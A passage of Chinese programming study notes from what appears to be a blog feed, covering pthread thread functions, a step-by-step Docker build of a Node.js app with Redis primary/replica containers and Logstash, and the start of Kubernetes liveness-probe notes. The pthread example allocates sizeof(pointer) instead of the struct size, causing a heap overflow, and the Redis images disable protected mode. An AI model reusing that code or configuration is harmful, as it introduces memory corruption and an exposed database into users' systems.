线程主函数返回值、<code>pthread_exit</code>—&gt;<code>void *</code>;等待线程结束 <code>pthread_jion</code> 函数参数—&gt;<code>void **</code></li></ul><p>使用pthread_join获取子线程返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> var;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> *<span class="title">tval</span>;</span></span><br><span class="line">tval = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(tval));</span><br><span class="line">tval-&gt;var = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(tval-&gt;str,<span class="string">"hello thread"</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span>*)tval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> *<span class="title">retval</span>;</span></span><br><span class="line">ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_create error"</span>);</span><br><span class="line">ret = pthread_join(tid,(<span class="keyword">void</span>**)&amp;retval);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_join error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child thread exit with var=%d,str=%s\n"</span>,retval-&gt;var,retval-&gt;str);</span><br><span class="line">pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-cancel函数"><a href="#pthread-cancel函数" class="headerlink" title="pthread_cancel函数"></a>pthread_cancel函数</h5><p>杀死一个线程，需要到达取消点，如果子线程没有到达取消点，那么<code>pthread_cancel</code>无效，我们可以在程序中，手动添加一个取消点，使用<code>pthread_testcancel()</code>，成功被<code>pthread_cancel()</code>杀死的线程，返回<code>-1</code>，可以使用<code>pthread_join</code>回收。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cancel</span><span class="params">(<span class="keyword">pthread_t</span> thread)</span></span></span><br></pre></td></tr></table></figure><h5 id="pthread-detach函数"><a href="#pthread-detach函数" class="headerlink" title="pthread_detach函数"></a>pthread_detach函数</h5><p>设置线程分离</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="keyword">pthread_t</span> thread)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">返回值：</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：errno</span><br><span class="line">  </span><br><span class="line">thread:待分离的线程id</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;信号&quot;&gt;&lt;a href=&quot;#信号&quot; class=&quot;headerlink&quot; title=&quot;信号&quot;&gt;&lt;/a&gt;信号&lt;/h4&gt;&lt;h5 id=&quot;信号概念&quot;&gt;&lt;a href=&quot;#信号概念&quot; class=&quot;headerlink&quot; title=&quot;信号概念&quot;&gt;&lt;/a&gt;信号概念&lt;/h
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Docker构建多容器应用栈</title>
    <link href="elssm.github.io/2021/10/11/Docker%E6%9E%84%E5%BB%BA%E5%A4%9A%E5%AE%B9%E5%99%A8%E5%BA%94%E7%94%A8%E6%A0%88/"/>
    <id>elssm.github.io/2021/10/11/Docker构建多容器应用栈/</id>
    <published>2021-10-11T07:37:25.000Z</published>
    <updated>2021-10-11T11:08:19.300Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>在这个例子中，需要做的是把一个使用<code>Express</code>框架的并且带有<code>Redis</code>后端的<code>Node.js</code>应用完全Docker化。目的是能够将Docker的特性结合起来使用。主要的工作内容是</p><ul><li>一个Node容器，用来服务于Node应用</li><li>一个Redis主容器，用于保存和集群化应用状态</li><li>两个Redis副本容器，用于集群化应用状态</li><li>一个日志容器，用于捕获应用日志</li></ul><p>最终我们的Node应用程序会运行在一个容器中，它后面会有一个配置为”主-副本”模式运行在多个容器中的Redis集群。</p><h4 id="Node-js镜像"><a href="#Node-js镜像" class="headerlink" title="Node.js镜像"></a>Node.js镜像</h4><p>首先我们需要构建一个安装了Node.js的镜像。这个镜像有Express应用和相应的必要的软件包。</p><p>第一步先在本地创建一个名为<code>nodejs</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodejs &amp;&amp; cd nodejs</span><br></pre></td></tr></table></figure><p>第二步在<code>nodejs</code>文件夹下创建一个存放<code>node.js</code>应用源码的文件夹名为<code>nodeapp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodeapp &amp;&amp; cd nodeapp</span><br></pre></td></tr></table></figure><p>获取<code>node.js</code>源码</p><p>如果下载不下来的话，代码地址:<a href="https://github.com/turnbullpress/dockerbook-code/tree/master/code/6/node/nodejs/nodeapp" target="_blank" rel="noopener">https://github.com/turnbullpress/dockerbook-code/tree/master/code/6/node/nodejs/nodeapp</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/turnbullpress/dockerbook-code/master/code/6/node/nodejs/nodeapp/package.json</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/turnbullpress/dockerbook-code/master/code/6/node/nodejs/nodeapp/server.js</span><br></pre></td></tr></table></figure><p>第三步回到<code>nodejs</code>目录下，创建Dockerfile文件。这个镜像安装了Node，然后我们将<code>nodeapp</code>的源代码通过ADD指令添加到<code>/opt/nodeapp</code>目录。这个Node.js应用是一个简单的Express服务器，包含了<code>package.json</code>文件和实际应用代码的<code>server.js</code>文件。<code>server.js</code>文件引入了所有的依赖，并启动了Express应用，Express应用把session信息保存到Redis里，并创建了一个以JSON格式返回状态信息的节点，这个节点默认使用redis_primary作为主机名去连接Redis。这个应用会把日志记录到<code>/var/log/nodeapp/nodeapp.log</code>文件里，并监听3000端口。我们还将工作目录设置为<code>/opt/nodeapp</code>，并且安装了Node应用的必要软件包，还创建了用于存放Node应用日志的卷<code>/var/log/nodeapp</code>，最后公开了3000端口，并使用ENTRYPOINT指定了运行Node应用的命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq install nodejs npm</span><br><span class="line"><span class="keyword">RUN</span> mkdir -p /var/log/nodeapp</span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span> nodeapp /opt/nodeapp/</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span> /opt/nodeapp</span><br><span class="line"><span class="keyword">RUN</span> npm install</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span> [ "/var/log/nodeapp" ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "nodejs", "server.js" ]</span><br></pre></td></tr></table></figure><p>第四步构建镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/nodejs .</span><br></pre></td></tr></table></figure><h4 id="Redis基础镜像"><a href="#Redis基础镜像" class="headerlink" title="Redis基础镜像"></a>Redis基础镜像</h4><p>第一步先在本地创建一个名为<code>redis_base</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_base &amp;&amp; cd redis_base</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件。这个Redis基础镜像从PPA库安装了最新版本的Redis包。并指定了两个卷，公开了Redis的默认端口是6379。我们只是讲这个镜像作为基础镜像从而构建别的镜像，因此不会执行这个镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get install -qq software-properties-common</span><br><span class="line"><span class="keyword">RUN</span> add-apt-repository ppa:chris-lea/redis-server</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq install redis-server redis-tools</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span> [ "/var/lib/redis", "/var/log/redis" ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span> []</span><br></pre></td></tr></table></figure><p>第三步构建Redis基础镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis .</span><br></pre></td></tr></table></figure><h4 id="Redis主镜像"><a href="#Redis主镜像" class="headerlink" title="Redis主镜像"></a>Redis主镜像</h4><p>第一步先在本地创建一个名为<code>redis_primary</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_primary &amp;&amp; cd redis_primary</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件。Redis主镜像基于Redis基础镜像，并通过ENTRYPOINT指定了Redis服务启动命令，将Redis服务的日志文件保存到<code>/var/log/redis/redis-server.log</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> elssm/redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "redis-server", "--protected-mode no", "--logfile /var/log/redis/redis-server.log" ]</span><br></pre></td></tr></table></figure><p>第三步构建Redis主奖项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis_primary .</span><br></pre></td></tr></table></figure><h4 id="Redis副本镜像"><a href="#Redis副本镜像" class="headerlink" title="Redis副本镜像"></a>Redis副本镜像</h4><p>为了配合Redis主镜像，我们会创建Redis副本镜像，保证为Node.js应用提供Redis服务的冗余度。</p><p>第一步先在本地创建一个名为<code>redis_replica</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_replica &amp;&amp; cd redis_replica</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件。Redis副本镜像也是基于Redis基础镜像构建的。并通过ENTRYPOINT指定了运行Redis服务器的命令，设置了日志文件存储位置和<code>slaveof</code>选项，这样就把Redis配置为主-副本模式，从这个镜像构建的任何容器都会将redis_primary主机的Redis作为主服务，连接其6379端口，成为对应的副本服务器</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> elssm/redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "redis-server", "--protected-mode no", "--logfile /var/log/redis/redis-replica.log", "--slaveof redis_primary 6379" ]</span><br></pre></td></tr></table></figure><p>第三步构建Redis副本镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis_replica .</span><br></pre></td></tr></table></figure><h4 id="创建Redis后端集群"><a href="#创建Redis后端集群" class="headerlink" title="创建Redis后端集群"></a>创建Redis后端集群</h4><p>现在我们已经有了Redis主镜像和副本镜像。如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/1.png" alt="1"></p><p>接下来我们可以构建自己的Redis环境了。首先我们创建一个用来运行我们的Express应用程序的网络，名为<code>express</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network create express</span><br></pre></td></tr></table></figure><p>使用<code>docker network ls</code>查看网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p><img src="/2021/10/11/Docker构建多容器应用栈/2.png" alt="2"></p><p>现在让我们在这个网络中运行Redis主容器，如下代码所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_primary --net express --name redis_primary elssm/redis_primary</span><br></pre></td></tr></table></figure><p>这里使用<code>docker run</code>命令从<code>elssm/redis_primary</code>镜像创建了一个容器。<code>-h</code>用来设置容器的主机名。这会覆盖默认的行为(默认将容器的主机名设置为容器ID)并允许我们指定自己的主机名，使用这个标志可以确保容器使用<code>redis_primary</code>作为主机名，并被本地的DNS服务正确解析。<code>--net</code>确保该容器在<code>express</code>网络中运行，<code>--name</code>确保容器的名字是<code>redis_primary</code>        </p><p>接下来使用<code>docker logs</code>命令来查看Redis主容器的运行情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs redis_primary</span><br></pre></td></tr></table></figure><p>执行命令后发现什么都没有，这是因为Redis服务会将日志记录到一个文件而不是记录到标准输出，所有使用Docker查不到任何日志。因此我们可以使用之前创建的<code>/var/log/redis</code>卷。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_primary ubuntu cat /var/log/redis/redis-server.log</span><br></pre></td></tr></table></figure><p>其中<code>-it</code>是以交互方式运行了另一个容器，<code>--rm</code>会在进程运行完后自动删除容器。<code>--volumes-from</code>告诉它从<code>redis_primary</code>容器挂载了所有的卷，然后我们指定了一个ubuntu基础镜像，并执行cat命令来查看日志，这种方式利用了卷的优点，可以直接从    <code>redis_primary</code>容器挂载<code>/var/log/redis</code>目录并读取里面的日志文件，日志文件内容如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/3.png" alt="3"></p><p>接下来我们创建一个Redis副本容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_replica1 --name redis_replica1 --net express elssm/redis_replica</span><br></pre></td></tr></table></figure><p>这里我们运行了另一个容器，这个容器来自<code>elssm/redis_replica</code>镜像，<code>-d</code>标志在后台运行，<code>-h</code>指定主机名，<code>--name</code>指定容器名，<code>--net</code>指定在<code>express</code>网络中运行Redis副本容器。</p><p>和查看Redis主容器一样，我们来查看一下Redis副本容器中的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_replica1 ubuntu cat /var/log/redis/redis-replica.log</span><br></pre></td></tr></table></figure><p>日志文件内容如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/4.png" alt="4"></p><p>到这里我们已经成功启动了redis_primary和redis_replica1容器，并让这两个容器进行主从复制。现在我们再来加入另一个容器副本redis_replica2，从而确保万无一失！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_replica2 --name redis_replica2 --net express elssm/redis_replica</span><br></pre></td></tr></table></figure><p>查看副本redis_replica2容器中的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_replica2 ubuntu cat /var/log/redis/redis-replica.log</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/5.png" alt="5"></p><h4 id="创建Node容器"><a href="#创建Node容器" class="headerlink" title="创建Node容器"></a>创建Node容器</h4><p>现在我们已经让Redis集群运行了，我们可以为Node.js应用启动一个容器，代码如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name nodeapp -p 3000:3000 --net express elssm/nodejs</span><br></pre></td></tr></table></figure><p>这里我们从<code>elssm/nodejs</code>镜像创建了一个新容器，命名为<code>nodeapp</code>，并将容器内的3000端口映射到宿主机的3000端口，同样我们的<code>nodeapp</code>容器也是运行在express网络中的。</p><p>使用<code>docker logs</code>命令来查看<code>nodeapp</code>容器在做什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> docker logs nodeapp</span><br><span class="line">Listening on port 3000</span><br></pre></td></tr></table></figure><p>访问本地3000端口，如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/6.png" alt="6"></p><p>这个输出表明应用正在工作，浏览器的会话状态(session)回先被记录到Redis主容器redis_primary，然后复制到两个Redis副本容器redis_replica1和redis_replica2</p><h4 id="捕获应用日志"><a href="#捕获应用日志" class="headerlink" title="捕获应用日志"></a>捕获应用日志</h4><p>现在应用已经正常运行了，我们需要把这个应用放到生产环境中，在生产环境里需要确保可以捕获日志并将日志保存到日志服务器。我们将使用Logstash来完成这件事，首先创建一个Logstash镜像。</p><p>第一步还是在本地创建一个名为<code>logstash</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir logstash &amp;&amp; cd logstash</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qq install wget gnupg2 openjdk-8-jdk</span><br><span class="line">RUN wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -</span><br><span class="line">RUN echo "deb https://artifacts.elastic.co/packages/5.x/apt stable main" | tee -a /etc/apt/sources.list.d/elastic-5.x.list</span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qq install logstash</span><br><span class="line"></span><br><span class="line">WORKDIR /usr/share/logstash</span><br><span class="line"></span><br><span class="line">ADD logstash.conf /usr/share/logstash/</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [ "bin/logstash" ]</span><br><span class="line">CMD [ "-f", "logstash.conf", "--config.reload.automatic" ]</span><br></pre></td></tr></table></figure><p>这个镜像在安装了Logstash之后，将<code>logstash.conf</code>文件使用ADD指令添加到了<code>/usr/share/logstash/</code>目录。<code>logstash.conf</code>文件和Dockerfile在统计目录下，它的内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">    type =&gt; "syslog"</span><br><span class="line">    path =&gt; ["/var/log/nodeapp/nodeapp.log", "/var/log/redis/redis-server.log"]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  stdout &#123;</span><br><span class="line">    codec =&gt; rubydebug</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个logstash配置很简单，它监控两个文件<code>/var/log/nodeapp/nodeapp.log</code>和<code>/var/log/redis/redis-server.log</code>。logstash会一直监控这两个文件，将其中新的内容发送个Logstash，配置文件的第二部分是output部分，接受所有logstash输入的内容并将其输出到标准输出上，在实际情况中，一般会将logstash配置为输出到ElasticSearch集群或者是其他的目的地。</p><p>第三步构建logstash镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/logstash .</span><br></pre></td></tr></table></figure><p>镜像构建成功之后，我们从这个镜像启动一个容器，代码如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name logstash --volumes-from redis_primary --volumes-from nodeapp elssm/logstash</span><br></pre></td></tr></table></figure><p>这样我们就启动了一个名为logstash的新容器，并通过<code>--volumes-from</code>标志分别挂载了redis_primary和nodeapp容器的卷，这样就可以访问Redis和Node的日志文件了，任何加到这些日志文件里的内容都会反应在logstash容器的卷里。</p><p>现在可以使用<code>-f</code>标志来查看logstash容器的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f logstash</span><br></pre></td></tr></table></figure><p>在浏览器里刷新Web应用之后，会产生一个新的日志时间，我们就能在logstash容器的输出中看到这个事件。如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/7.png" alt="7"></p><p>相应的当我们启动redis_primary容器后，也可以在logstash中看到相应的日志事件</p><p><img src="/2021/10/11/Docker构建多容器应用栈/8.png" alt="8"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;在这个例子中，需要做的是把一个使用&lt;code&gt;Express&lt;/code&gt;框架的并且带有&lt;code&gt;Redis&lt;/code&gt;后端的&lt;code
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes in Action Learning Notes</title>
    <link href="elssm.github.io/2021/10/07/Kubernetes-in-Action-Learning-Notes/"/>
    <id>elssm.github.io/2021/10/07/Kubernetes-in-Action-Learning-Notes/</id>
    <published>2021-10-07T02:10:06.000Z</published>
    <updated>2021-10-12T09:32:51.975Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>对于《Kubernetes in action》这本书前三章节相关的笔记，我都记录在下面这个链接了，有需求的可以看看。</p><p><a href="http://elssm.top/2021/03/22/Docker-Kubernetes%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://elssm.top/2021/03/22/Docker-Kubernetes%E5%AD%A6%E4%B9%A0/</a></p><h4 id="存活探针"><a href="#存活探针" class="headerlink" title="存活探针"></a>存活探针</h4><p>Kubernetes可以通过存活探针(liveness probe)检查容器是否还在运行，可以为pod中的每个容器单独指定存活探针。如果探测失败，Kubernetes将定期执行探针并重新启动容器。</p><h5 id="Kubernetes三种探测容器的机制"><a href="#Kubernetes三种探测容器的机制" class="headerlink" title="Kubernetes三种探测容器的机制"></a>Kubernetes三种探测容器的机制</h5><ul><li>HTTP GET探针对容器的IP地址执行HTTP GET请求。如果HTTP响应状态码事<code>2xx</code>或<code>3xx</code>，则认为探测成功，如果服务器返回错误响应状态码或是没有收到响应，则认为探测事失败的，这个时候容器将会被重新启动。</li><li>TCP套接字探针尝试与容器指定端口建立TCP连接，如果连接建立成功，则探测成功，否则，容器重新启动。</li><li>Exec探针在容器内执行任意命令，并检查命令的退出状态码，如果状态码是0，则探测成功。所有其他的状态码都会被认为失败。</li></ul><h5 id="创建基于HTTP的存活探针"><a href="#创建基于HTTP的存活探针" class="headerlink" title="创建基于HTTP的存活探针"></a>创建基于HTTP的存活探针</h5><p>老规矩，先来创建一个名为<code>kubia-liveness-probe.yaml</code>的文件，该pod的描述文件定义了一个<code>httpGet</code>存活探针，该探针告诉Kubernetes定期在端口8080路径上执行HTTP GET请求，以确定该容器是否健康。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubia-liveness</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">luksa/kubia-unhealthy</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kubia</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>接下来使用<code>kubectl create</code>从YAML文件创建pod</p><figure 